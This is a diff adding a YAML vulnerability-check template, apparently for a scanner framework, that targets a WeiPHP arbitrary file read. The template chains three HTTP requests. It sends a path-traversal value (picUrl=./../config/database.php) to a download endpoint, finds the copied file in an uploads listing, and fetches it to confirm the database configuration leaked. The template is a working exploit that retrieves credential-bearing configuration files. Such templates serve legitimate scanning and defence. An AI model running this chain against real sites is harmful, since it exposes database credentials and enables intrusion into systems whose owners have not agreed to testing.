@@ -1,0 +1,35 @@
+name: yaml-poc-weiphp-weiphp-readfile-CT-158545
+binding: 5770e581-020f-45b1-ac7c-982445484019
+detail:
+    author: system_user
+    vulnerability:
+        id: 55450716-9e38-4015-9996-2591991fbf66
+        level: high
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: |
+                "1":1
+        expression: response.status == 200
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /public/index.php/home/file/user_pics
+        expression: response.status == 200
+        output:
+            search: '"/public/uploads/picture/(?P<img>.+?)\"".bsubmatch(response.body)'
+            img: search["img"]
+    r2:
+        request:
+            cache: true
+            method: GET
+            path: /public/uploads/picture/{{img}}
+        expression: response.status == 200 && response.body.bcontains(b"data_auth_key") && response.body.bcontains(b"WeiPHP")
+expression: r0() && r1() && r2()
